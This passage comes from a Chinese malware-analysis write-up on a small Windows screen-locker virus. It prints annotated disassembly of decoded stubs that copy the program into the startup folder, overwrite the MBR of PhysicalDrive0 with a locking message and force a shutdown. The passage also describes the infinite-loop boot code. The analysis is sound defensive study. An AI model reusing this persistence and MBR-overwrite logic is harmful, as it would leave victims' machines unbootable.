
![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_PGEZPBK5PP6E524.png)

## 2.2 小总结

由于这个程序并不是很大，有了上面对几个函数的分析，现在已经可以看一下这个程序的整体流程了：

![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_MWHQZFNGUH45GYP.png)

从上图可以看出，这个程序分成四个部分，第一部分就是我们上面分析的检查调试器的部分，第二部分对位于`0x405010`，长度为`0x4C`字节序列进行了按位取反的解码并执行，第三部分对位于`0x4050BC`，长度为`0xFE`字节序列进行了按位取反的编码并执行，最后一部分是退出程序。除了最后一部分之外，其他三部份的流程都是一样的：**修改权限→解码→执行→恢复编码→恢复权限**。

所以接下来要做的，就是对第二、三部分解码后的代码进行分析。

## 2.3 第二部分代码

以下是调试得到的第二部分解码后的代码：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48 | `00405010`    `60`              `pushad`  `00405011`    `6A` `04`           `push` `0x4`  `00405013`    `68` `00300000`     `push` `0x3000`  `00405018`    `68` `00040000`     `push` `0x400`  `0040501D`    `6A` `00`           `push` `0x0`  `0040501F`    `FF15 A0304000   call dword ptr ds:[<&KERNEL32.VirtualAlloc>]               ; 分配大小为``0x400``字节的空间`  `00405025`    `89C6`            `mov esi,eax`  `00405027`    `6A` `04`           `push` `0x4`  `00405029`    `68` `00300000`     `push` `0x3000`  `0040502E`    `68` `00040000`     `push` `0x400`  `00405033`    `6A` `00`           `push` `0x0`  `00405035`    `FF15 A0304000   call dword ptr ds:[<&KERNEL32.VirtualAlloc>]               ; 再次分配大小为``0x400``字节的空间`  `0040503B`    `89C7`            `mov edi,eax`  `0040503D`    `85FF`            `test edi,edi                                               ;`  `0040503F`    `74` `79`           `je short` `50fcbf3d``.``004050BA`  `00405041`    `85F6`            `test esi,esi                                               ;`  `00405043`    `74` `75`           `je short` `50fcbf3d``.``004050BA`  `00405045`    `68` `00020000`     `push` `0x200`  `0040504A`    `56`              `push esi                                                   ;`  `0040504B`    `6A` `00`           `push` `0x0`  `0040504D`    `FF15` `98304000`   `call dword ptr ds:[<&KERNEL32.GetModuleFileNameW>]         ; 获得当前程序路径`  `00405053`    `6A` `01`           `push` `0x1`  `00405055`    `6A` `07`           `push` `0x7`  `00405057`    `57`              `push edi                                                   ;`  `00405058`    `6A` `00`           `push` `0x0`  `0040505A`    `FF15` `6C314000`   `call dword ptr ds:[<&SHELL32.SHGetSpecialFolderPathW>]     ; 获得开机启动目录路径`  `00405060`    `85C0`            `test eax,eax`  `00405062`    `74` `3A`           `je short` `50fcbf3d``.``0040509E`  `00405064`    `E8` `24000000`     `call` `50fcbf3d``.``0040508D`                                     `; 将本程序复制到开机启动目录`  `00405069`    `5C`              `pop esp                                                    ; 下面是垃圾代码，没什么意义`  `...`  `...`  `0040508D`    `57`              `push edi                                                   ;`  `0040508E`    `FF15 B0304000   call dword ptr ds:[<&KERNEL32.lstrcatW>]                   ; kernel32.lstrcatW`  `00405094`    `6A` `01`           `push` `0x1`  `00405096`    `57`              `push edi                                                   ;`  `00405097`    `56`              `push esi                                                   ;`  `00405098`    `FF15` `8C304000`   `call dword ptr ds:[<&KERNEL32.CopyFileW>]                  ; kernel32.CopyFileW`  `0040509E`    `68` `00800000`     `push` `0x8000`  `004050A3`    `6A` `00`           `push` `0x0`  `004050A5`    `56`              `push esi                                                   ;`  `004050A6`    `FF15 A4304000   call dword ptr ds:[<&KERNEL32.VirtualFree>]                ; kernel32.VirtualFree`  `004050AC`    `68` `00800000`     `push` `0x8000`  `004050B1`    `6A` `00`           `push` `0x0`  `004050B3`    `57`              `push edi                                                   ;`  `004050B4`    `FF15 A4304000   call dword ptr ds:[<&KERNEL32.VirtualFree>]                ; kernel32.VirtualFree`  `004050BA`    `61`              `popad`  `004050BB`    `C3              retn` |

代码很简单，已经进行了必要的注释，可以看到这段代码用于设置开机自启。

## 2.4 第三部分代码

以下是调试得到的第三部分解码后的代码，其中省略了垃圾代码，这个程序通过这些垃圾代码对分析进行了干扰，如果不省略，`call`指令会跳转到指令的中间，但是并不复杂。

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49 | `004050BC`    `60`              `pushad`  `004050BD`    `6A` `00`           `push` `0x0`  `004050BF`    `6A` `00`           `push` `0x0`  `004050C1`    `6A` `03`           `push` `0x3`  `004050C3`    `6A` `00`           `push` `0x0`  `004050C5`    `6A` `02`           `push` `0x2`  `004050C7`    `68` `00000040`     `push` `0x40000000`  `004050CC`    `90`              `nop`  `004050CD`    `E8` `26000000`     `call` `50fcbf3d``.``004050F8`  `...`  `...`  `004050F8`    `FF15` `90304000`   `call dword ptr ds:[<&KERNEL32.CreateFileW>]                     ; 打开PhysicalDrive0`  `004050FE`    `83F8` `FF` `cmp` `eax,``-``0x1`  `00405101`    `0F84` `B1000000   je` `50fcbf3d``.``004051B8`  `00405107`    `89C6`            `mov esi,eax`  `00405109`    `6A` `00`           `push` `0x0`  `0040510B`    `54`              `push esp`  `0040510C`    `FF35` `10104000`   `push dword ptr ds:[``0x401010``]`  `00405112`    `FF35` `0C104000`   `push dword ptr ds:[``0x40100C``]                                    ;` `50fcbf3d``.``004051BA`  `00405118`    `56`              `push esi`  `00405119`    `68` `FF000000     push` `0xFF`  `0040511E`    `FF35` `10104000`   `push dword ptr ds:[``0x401010``]`  `00405124`    `FF35` `0C104000`   `push dword ptr ds:[``0x40100C``]`  `0040512A`    `E8 D3CEFFFF     call <``50fcbf3d``.decode>                                          ; 这里解码获得要写入MBR的数据`  `0040512F`    `FF15 AC304000   call dword ptr ds:[<&KERNEL32.WriteFile>]                       ; 写入MBR`  `00405135`    `68` `FF000000     push` `0xFF`  `0040513A`    `FF35` `10104000`   `push dword ptr ds:[``0x401010``]`  `00405140`    `FF35` `0C104000`   `push dword ptr ds:[``0x40100C``]`  `00405146`    `E8 B7CEFFFF     call <``50fcbf3d``.decode>                                          ; 重新编码，恢复解码前数据`  `0040514B`    `56`              `push esi`  `0040514C`    `FF15` `88304000`   `call dword ptr ds:[<&KERNEL32.CloseHandle>]`  `00405152`    `6A` `00`           `push` `0x0`  `00405154`    `6A` `00`           `push` `0x0`  `00405156`    `90`              `nop`  `00405157`    `E8` `2E000000`     `call` `50fcbf3d``.``0040518A`  `...`  `...`  `0040518A`    `90`              `nop`  `0040518B`    `E8` `10000000`     `call` `50fcbf3d``.``004051A0`  `...`  `...`  `004051A0`    `90`              `nop`  `004051A1`    `E8` `0A000000`     `call` `50fcbf3d``.``004051B0`  `...`  `...`  `004051B0`    `6A` `00`           `push` `0x0`  `004051B2`    `FF15` `70314000`   `call dword ptr ds:[<&SHELL32.ShellExecuteW>]                    ; shell32.ShellExecuteW`  `004051B8`    `61`              `popad`  `004051B9`    `C3              retn` |

首先调用`CreateFileW`，得到`PhysicalDrive0`的句柄，即MBR的位置

![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_GTV5P7U769WN5WZ.png)

然后解密获得MBR写入数据，调用`WriteFile`写入MBR：

![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_YFHNZPRRVZKKXPF.png)

最后执行`shutdown`，关机

![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_ANP2T3UEGS3WJCP.png)

## 2.5 MBR分析

先看一下修改MBR之后的开机界面：

![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_673ZE4PYSV7QD5S.png)

写入MBR的数据见附件，这个文件我是通过PE工具里面的Bootice引导扇区管理提取出来的。

将文件导入IDA之后发现，这个代码是在是有点简单，一开始是打印字符串，就是上面开机画面中的字符串：

![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_JQGC6MEKS9RC7Y2.png)

之后直接陷入了无限循环：

![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_BK4QR4W9CDPFGED.png)

打印的字符串也可以看到：

![图片描述](https://bbs.kanxue.com/upload/attach/202106/600394_99KY5WKH9JYE8TR.png)

所以这个程序是一个骗人的锁机病毒，到目前为止分析的都很顺利，可是我以为的反虚拟机呢？一开始就是以为有这个功能才决定分析一下这个小程序的，结果发现并没有这个功能，U•ェ•\*U~

# 3. 被骗的原因
